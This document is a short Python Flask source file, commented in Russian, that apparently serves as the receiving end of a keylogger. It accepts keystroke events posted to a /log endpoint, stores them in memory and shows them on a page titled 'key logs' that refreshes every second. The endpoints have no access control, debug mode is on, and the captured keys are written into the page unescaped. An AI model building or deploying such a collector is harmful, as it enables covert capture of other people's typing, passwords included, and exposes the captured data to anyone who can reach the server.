from flask import Flask, request, jsonify, render_template_string

app = Flask(__name__)

# Хранилище данных (в памяти, пока сервер работает)
logs = []

@app.route('/log', methods=['POST'])
def log_key():
    data = request.get_json()
    logs.append(data)   # сохраняем каждое событие
    print("Получено:", data)
    return {"status": "ok"}

# API для получения всех данных
@app.route('/data', methods=['GET'])
def get_data():
    return jsonify(logs)

# Веб-страница для отображения
@app.route('/')
def index():
    html = """
    <!DOCTYPE html>
    <html>
    <head>
        <title>Логи нажатий</title>
        <style>
            body { font-family: Arial, sans-serif; padding: 20px; }
            table { border-collapse: collapse; width: 50%; }
            th, td { border: 1px solid #ccc; padding: 8px; text-align: center; }
            th { background: #f2f2f2; }
        </style>
    </head>
    <body>
        <h2>Логи клавиш</h2>
        <table>
            <thead>
                <tr><th>#</th><th>Клавиша</th></tr>
            </thead>
            <tbody id="logTable"></tbody>
        </table>

        <script>
        async function loadData() {
            let response = await fetch('/data');
            let logs = await response.json();
            let table = document.getElementById('logTable');
            table.innerHTML = '';
            logs.forEach((item, i) => {
                let row = `<tr><td>${i+1}</td><td>${item.key}</td></tr>`;
                table.innerHTML += row;
            });
        }
        setInterval(loadData, 1000); // обновляем каждую секунду
        </script>
    </body>
    </html>
    """
    return render_template_string(html)

if __name__ == '__main__':
    app.run(debug=True, port=5000)
